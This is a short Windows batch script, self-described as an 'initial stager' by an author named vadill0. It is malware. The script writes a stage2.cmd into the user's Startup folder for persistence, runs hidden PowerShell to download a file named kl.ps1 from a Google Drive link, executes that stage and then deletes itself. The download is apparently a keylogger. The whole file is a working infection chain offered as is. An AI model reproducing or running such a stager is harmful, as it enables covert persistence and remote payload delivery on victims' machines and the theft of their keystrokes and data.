@echo off
@REM initial stager
@REM author vadill0

@REM variables
set "VAR=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM cd STARTUP directory
cd "%STARTUP%"

@REM write payloads
( 
    @echo off
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://drive.google.com/file/d/1uSz1ypRtIMx0nZuy4VhFI4fCulHKLYwE/view?usp=sharing -OutFile kl.ps1"
) > stage2.cmd

@REM run payload
powershell ./stage2.cmd

@REM cd back to original directory
cd "%VAR%"
del initial.cmd